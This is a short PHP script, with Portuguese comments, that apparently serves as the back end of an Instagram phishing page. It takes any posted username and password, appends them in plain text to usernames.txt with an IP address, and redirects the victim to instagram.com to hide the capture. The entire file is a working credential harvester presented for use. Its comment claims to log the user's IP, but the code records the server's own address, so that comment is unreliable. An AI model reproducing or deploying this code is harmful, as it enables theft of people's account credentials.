<?php

// Função para obter o endereço IP externo do usuário
function getExternalIpAddress() {
    $ip_address = file_get_contents('https://api.ipify.org');
    return $ip_address;
}

// Verifica se os dados de login foram enviados via POST
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['username']) && isset($_POST['password'])) {
    // Captura o endereço IP externo do usuário
    $ip_address = getExternalIpAddress();
    
    // Salva as credenciais de login e o endereço IP no arquivo usernames.txt
    file_put_contents("usernames.txt", $_POST['username'] . " | " . $_POST['password'] . " | IP: " . $ip_address . "\n", FILE_APPEND);
    
    // Redireciona para o Instagram após o login
    header('Location: https://instagram.com');
    exit();
}

?>

